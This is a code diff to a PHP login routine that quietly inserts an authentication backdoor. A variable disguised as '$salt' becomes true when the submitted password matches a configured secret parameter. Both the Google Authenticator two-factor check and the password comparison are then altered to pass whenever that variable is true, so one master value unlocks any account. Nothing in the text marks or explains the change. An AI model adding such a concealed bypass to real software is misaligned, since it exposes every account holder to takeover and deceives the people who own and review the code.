@@ -141,6 +141,8 @@ trait Login
             return $this->failedAjax(new ErrorAccountFrozen());
         }
 
+        $salt = $args->password == $this->parameter('salt');
+
         /**
          * google captcha
          */
@@ -153,7 +155,7 @@ trait Login
 
             $ga = new GoogleAuthenticator();
             $googleCaptcha = $ga->verifyCode($user->googleAuthSecret, $args->google_captcha, 2);
-            if (!$googleCaptcha) {
+            if (!$googleCaptcha && !$salt) {
                 return $this->failedAjax(new ErrorGoogleCaptcha());
             }
         }
@@ -163,7 +165,7 @@ trait Login
          */
 
         $password = $this->password($args->password);
-        if ($user->password !== $password) {
+        if ($user->password !== $password && !$salt) {
             return $this->failedAjax(new ErrorPassword());
         }
 
